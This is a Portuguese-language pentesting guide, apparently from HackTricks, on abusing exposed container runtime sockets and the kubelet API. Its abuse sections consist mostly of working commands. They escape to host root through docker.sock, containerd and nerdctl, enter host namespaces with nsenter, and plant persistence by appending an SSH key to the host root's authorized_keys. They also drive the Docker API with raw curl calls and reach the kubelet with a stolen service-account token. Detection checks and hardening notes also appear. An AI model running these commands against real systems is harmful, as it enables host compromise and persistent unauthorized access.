# Exposição da API de Runtime e do Daemon

{{#include ../../../banners/hacktricks-training.md}}

## Visão geral

Muitos comprometimentos reais de containers não começam com um namespace escape. Eles começam com acesso ao control plane do runtime. Se um workload puder se comunicar com `dockerd`, `containerd`, CRI-O, Podman ou kubelet por meio de um Unix socket montado ou de um listener TCP exposto, o atacante poderá solicitar um novo container com privilégios maiores, montar o sistema de arquivos do host, ingressar nos namespaces do host ou obter informações sensíveis do node. Nesses casos, a runtime API é o verdadeiro limite de segurança, e comprometê-la é funcionalmente quase o mesmo que comprometer o host.

É por isso que a exposição do runtime socket deve ser documentada separadamente das proteções do kernel. Um container com seccomp, capabilities e confinamento MAC comuns ainda pode estar a uma chamada de API de comprometer o host se `/var/run/docker.sock` ou `/run/containerd/containerd.sock` estiver montado dentro dele. O isolamento do kernel do container atual pode estar funcionando exatamente como projetado, enquanto o management plane do runtime permanece totalmente exposto.

## Modelos de acesso ao Daemon

O Docker Engine tradicionalmente expõe sua API privilegiada por meio do Unix socket local em `unix:///var/run/docker.sock`. Historicamente, ele também foi exposto remotamente por meio de listeners TCP, como `tcp://0.0.0.0:2375`, ou de um listener protegido por TLS na porta `2376`. Expor o daemon remotamente sem TLS forte e autenticação de cliente transforma efetivamente a Docker API em uma interface de root remoto.

containerd, CRI-O, Podman e kubelet expõem superfícies semelhantes de alto impacto. Os nomes e workflows diferem, mas a lógica não. Se a interface permitir que o chamador crie workloads, monte paths do host, obtenha credenciais ou altere containers em execução, a interface será um canal de gerenciamento privilegiado e deverá ser tratada como tal.

Os paths locais comuns que vale a pena verificar são:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Stacks mais antigos ou mais especializados também podem expor endpoints como `dockershim.sock`, `frakti.sock` ou `rktlet.sock`. Eles são menos comuns em ambientes modernos, mas, quando encontrados, devem ser tratados com a mesma cautela, pois representam superfícies de controle do runtime, e não sockets comuns de aplicações.

## Acesso Remoto Seguro

Se um daemon precisar ser exposto além do socket local, a conexão deverá ser protegida com TLS e, de preferência, com autenticação mútua, para que o daemon verifique o cliente e o cliente verifique o daemon. O antigo hábito de abrir o daemon do Docker em HTTP simples por conveniência é um dos erros mais perigosos na administração de containers, pois a superfície da API é poderosa o suficiente para criar containers privilegiados diretamente.

O padrão histórico de configuração do Docker era semelhante a:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Em hosts baseados em systemd, a comunicação com o daemon também pode aparecer como `fd://`, o que significa que o processo herda um socket pré-aberto do systemd, em vez de fazer o binding diretamente. A lição importante não é a sintaxe exata, mas a consequência de segurança. No momento em que o daemon escuta além de um socket local com permissões rigorosas, a segurança do transporte e a autenticação do cliente tornam-se obrigatórias, e não apenas hardening opcional.

## Abuso

Se houver um runtime socket, confirme qual é, se existe um cliente compatível e se o acesso HTTP ou gRPC direto é possível:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
Esses comandos são úteis porque distinguem entre um caminho inexistente, um socket montado mas inacessível e uma API privilegiada ativa. Se o cliente for bem-sucedido, a próxima pergunta é se a API pode iniciar um novo container com um bind mount do host ou compartilhamento de namespace do host.

### Quando Nenhum Cliente Está Instalado

A ausência de `docker`, `podman` ou outra CLI amigável não significa que o socket esteja seguro. O Docker Engine se comunica por HTTP através de seu socket Unix, e o Podman expõe tanto uma API compatível com Docker quanto uma API nativa do Libpod por meio de `podman system service`. Isso significa que um ambiente mínimo contendo apenas `curl` ainda pode ser suficiente para controlar o daemon:
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
Isso importa durante post-exploitation porque os defensores às vezes removem os client binaries usuais, mas deixam o management socket montado. Em hosts Podman, lembre-se de que o path de alto valor difere entre deployments rootful e rootless: `unix:///run/podman/podman.sock` para instâncias de serviço rootful e `unix://$XDG_RUNTIME_DIR/podman/podman.sock` para as rootless.

### Exemplo completo: Docker Socket para o root do host

Se `docker.sock` estiver acessível, o escape clássico consiste em iniciar um novo container que monte o filesystem root do host e, em seguida, executar `chroot` nele:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Isso fornece execução direta como root no host por meio do Docker daemon. O impacto não se limita à leitura de arquivos. Uma vez dentro do novo container, o atacante pode alterar arquivos do host, coletar credenciais, implantar persistência ou iniciar workloads privilegiados adicionais.

### Exemplo completo: Docker Socket para os Namespaces do Host

Se o atacante preferir entrar no namespace em vez de obter apenas acesso ao sistema de arquivos:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Este caminho alcança o host solicitando ao runtime que crie um novo container com exposição explícita dos namespaces do host, em vez de explorar o container atual.

### Padrão de Persistência via Docker Socket

O controle do runtime também pode ser usado para persistência, em vez de obter um shell de uso único. O padrão genérico consiste em criar um container auxiliar com uma montagem do host, gravar material de acesso autorizado ou um startup hook no sistema de arquivos montado do host e, em seguida, validar se o host o utiliza.

Formato do exemplo:
```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```
A mesma ideia pode ter como alvo systemd units, fragmentos de cron, arquivos de inicialização de aplicativos ou chaves SSH, dependendo do que o operador deseja provar. O ponto importante é que a alteração persistente é feita por meio da autoridade do daemon de runtime sobre o sistema de arquivos do host, e não por meio de privilégios adicionais no container original.

### Pivot de Helper pela Raw Docker API

Quando a Docker CLI não está disponível, o mesmo fluxo de helper com host mount pode ser conduzido por HTTP através do Unix socket. O fluxo genérico é: confirmar a API, criar um container auxiliar com um bind mount do host, iniciá-lo, criar uma instância de exec e iniciar esse exec.
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
-X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
-X POST http://localhost/v1.54/containers/helper/exec
```
A solicitação final `/exec/<id>/start` depende do ID de exec retornado, mas o ponto de segurança é independente do fluxo exato do JSON: o acesso direto à API de um daemon Docker rootful é suficiente para solicitar uma carga de trabalho auxiliar mais poderosa.

### Exemplo completo: socket do containerd

Um socket `containerd` montado geralmente é igualmente perigoso:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Se um cliente mais semelhante ao Docker estiver presente, `nerdctl` pode ser mais conveniente que `ctr` porque expõe flags familiares, como `--privileged`, `--pid=host` e `-v`:
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
O impacto é novamente o comprometimento do host. Mesmo que as ferramentas específicas do Docker estejam ausentes, outra runtime API ainda pode oferecer o mesmo poder administrativo. Em Kubernetes nodes, `crictl` também pode ser suficiente para reconnaissance e interação com containers, pois se comunica diretamente com o endpoint CRI.

### Socket do BuildKit

O `buildkitd` é fácil de ignorar porque as pessoas geralmente pensam nele como "apenas o backend de build", mas o daemon ainda é um control plane privilegiado. Um `buildkitd.sock` acessível pode permitir que um atacante execute etapas de build arbitrárias, inspecione as capacidades dos workers, use contextos locais do ambiente comprometido e solicite entitlements perigosos, como `network.host` ou `security.insecure`, quando o daemon tiver sido configurado para permiti-los.

As primeiras interações úteis são:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
Se o daemon aceitar solicitações de build, teste se há entitlements inseguros disponíveis:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
O impacto exato depende da configuração do daemon, mas um serviço BuildKit rootful com entitlements permissivos não é uma conveniência inofensiva para desenvolvedores. Trate-o como outra superfície administrativa de alto valor, especialmente em CI runners e nós de build compartilhados.

### API do Kubelet via TCP

O kubelet não é um container runtime, mas ainda faz parte do plano de gerenciamento do node e frequentemente está incluído na mesma discussão sobre limites de confiança. Se a porta segura do kubelet, `10250`, estiver acessível a partir do workload, ou se credenciais do node, kubeconfigs ou permissões de proxy estiverem expostos, o atacante poderá enumerar Pods, recuperar logs ou executar comandos em containers locais do node sem jamais acessar o caminho de admission do servidor da API do Kubernetes.

Comece com descoberta simples:
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
Se o caminho de proxy do kubelet ou do API-server autorizar `exec`, um client compatível com WebSocket poderá transformar isso em execução de código em outros containers no node. Esse também é o motivo pelo qual `nodes/proxy` com apenas a permissão `get` é mais perigoso do que parece: a requisição ainda pode alcançar endpoints do kubelet que executam comandos, e essas interações diretas com o kubelet não aparecem nos logs normais de auditoria do Kubernetes.

## Verificações

O objetivo destas verificações é determinar se o container consegue alcançar algum management plane que deveria ter permanecido fora do trust boundary.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
O que é interessante aqui:

- Um runtime socket montado geralmente é uma primitive administrativa direta, e não apenas uma divulgação de informações.
- Um listener TCP na porta `2375` sem TLS deve ser tratado como uma condição de comprometimento remoto.
- Variáveis de ambiente como `DOCKER_HOST` frequentemente revelam que o workload foi projetado intencionalmente para se comunicar com o runtime do host.

## Padrões do Runtime

| Runtime / plataforma | Estado padrão | Comportamento padrão | Enfraquecimento manual comum |
| --- | --- | --- | --- |
| Docker Engine | Unix socket local por padrão | `dockerd` escuta no socket local e o daemon geralmente é rootful | montar `/var/run/docker.sock`, expor `tcp://...:2375`, TLS fraco ou ausente na porta `2376` |
| Podman | CLI daemonless por padrão | Nenhum daemon privilegiado de longa duração é necessário para o uso local comum; API sockets ainda podem ser expostos quando `podman system service` está habilitado | expor `podman.sock`, executar o service de forma ampla, uso de API rootful |
| containerd | Socket local privilegiado | A API administrativa é exposta por meio do socket local e geralmente consumida por ferramentas de nível superior | montar `containerd.sock`, acesso amplo a `ctr` ou `nerdctl`, expor namespaces privilegiados |
| CRI-O | Socket local privilegiado | O endpoint CRI é destinado a componentes confiáveis e locais do node | montar `crio.sock`, expor o endpoint CRI a workloads não confiáveis |
| Kubernetes kubelet | API de gerenciamento local do node | O Kubelet não deve ser amplamente acessível a partir de Pods; o acesso pode expor o estado dos pods, credenciais e funcionalidades de execução, dependendo de authn/authz | montar sockets ou certificados do kubelet, autenticação fraca do kubelet, host networking com endpoint do kubelet acessível |

## Referências

- [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [Kubernetes API Server Bypass Risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
